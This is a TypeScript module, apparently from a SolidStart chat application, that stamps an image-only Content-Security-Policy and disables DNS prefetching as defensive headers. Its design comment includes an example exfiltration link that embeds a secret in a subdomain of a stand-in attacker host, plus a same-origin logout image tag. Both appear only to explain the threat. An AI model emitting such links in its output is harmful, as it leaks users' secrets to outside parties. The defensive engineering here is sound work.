/**
 * Response headers the server-boot hook (`src/middleware.ts`) stamps on every
 * response the app's handler produces — pages, API routes and the SSE stream,
 * in `vinxi dev` and in the production build alike.
 *
 * Both are DEFENCE IN DEPTH behind the chat sanitizer, not the control. The
 * control is `lib/sanitize-html.ts`, which loads no image from anywhere but
 * the app's own Data Stash; these headers are what still holds if a future
 * edit to that file, or a second rendering path, gets it wrong.
 *
 * ## `Content-Security-Policy: img-src 'self' data: blob:` — and nothing else
 *
 * The browser refuses to fetch an image from any other origin, whatever put
 * the `<img>` there. Each source is one the app needs, checked in the code:
 *
 * - `'self'` — `/favicon.ico` (`entry-server.tsx`) and the Data Stash download
 *   route the sanitizer allows an image from.
 * - `data:` — every icon in the app. `presetIcons` emits each
 *   `i-material-symbols-*` glyph as a CSS `mask` whose image is an inline
 *   `data:image/svg+xml` URL, and a CSS image is governed by `img-src`; without
 *   it every icon renders as an empty box. It is also the sanitizer's raster
 *   exception. A `data:` image makes no request, so it cannot carry data out.
 * - `blob:` — no image uses one today. It is kept because it cannot leak (only
 *   the page's own script can mint a `blob:` URL) and because it is the only way
 *   a browser can show an image the app had to fetch with a token first — the
 *   Entra profile photo `AuthUser.profileImageUrl` was reserved for is one.
 *
 * Why ONLY `img-src`: a full policy (`default-src`, `script-src`, `style-src`)
 * needs a nonce threaded through SolidStart's streamed hydration scripts and
 * the inline `THEME_BOOT_SCRIPT`, plus `'unsafe-inline'` or hashes for the
 * server-rendered `style` attributes Solid emits, and Vite's dev client and
 * UnoCSS's dev stylesheet each need their own allowance. Getting any of that
 * wrong blanks the app rather than failing a test, and none of it is needed to
 * close the image channel. A directive that is absent restricts nothing, so
 * this policy changes exactly one thing: which hosts an image may come from.
 * Fonts (self-hosted, `font-src`), the Cytoscape and xterm canvases, the SSE
 * and HMR connections (`connect-src`) and the stash audio player (`media-src`)
 * are all outside it.
 *
 * Note what it does NOT stop: a same-origin image is `'self'`, so an
 * `<img src="/api/auth/logout">` would load. Refusing those is the sanitizer's
 * job, and the reason its rule is narrower than this header.
 *
 * ## `X-DNS-Prefetch-Control: off`
 *
 * A browser may resolve the host of a link in the page before anyone clicks
 * it — by default on pages served over plain HTTP, such as the dev server and
 * the local container. A rendered answer containing
 * `[x](https://<secret>.attacker.example/)` would then hand the secret to the
 * attacker's DNS server on render, with no click. The header turns that off
 * whatever the scheme. (The links themselves are not prefetched: no `<link>`
 * survives the sanitizer, and solid-router's hover preload skips any anchor
 * with a `target`, which the sanitizer stamps on every one.)
 */
import type { FetchEvent } from '@solidjs/start/server'

export const CONTENT_SECURITY_POLICY = "img-src 'self' data: blob:"

export const SECURITY_HEADERS: Readonly<Record<string, string>> = {
  'Content-Security-Policy': CONTENT_SECURITY_POLICY,
  'X-DNS-Prefetch-Control': 'off',
}

/**
 * The `onRequest` hook. Set on the response before the route runs, so a page
 * render, an API route's own `Response`, an error status and a redirect all
 * leave with the headers. A route that sets one of these names itself still
 * wins: h3's `sendWebResponse` copies a returned `Response`'s headers over
 * these with `setHeader`.
 */
export function setSecurityHeaders(event: Pick<FetchEvent, 'response'>): void {
  for (const [name, value] of Object.entries(SECURITY_HEADERS)) {
    event.response.headers.set(name, value)
  }
}
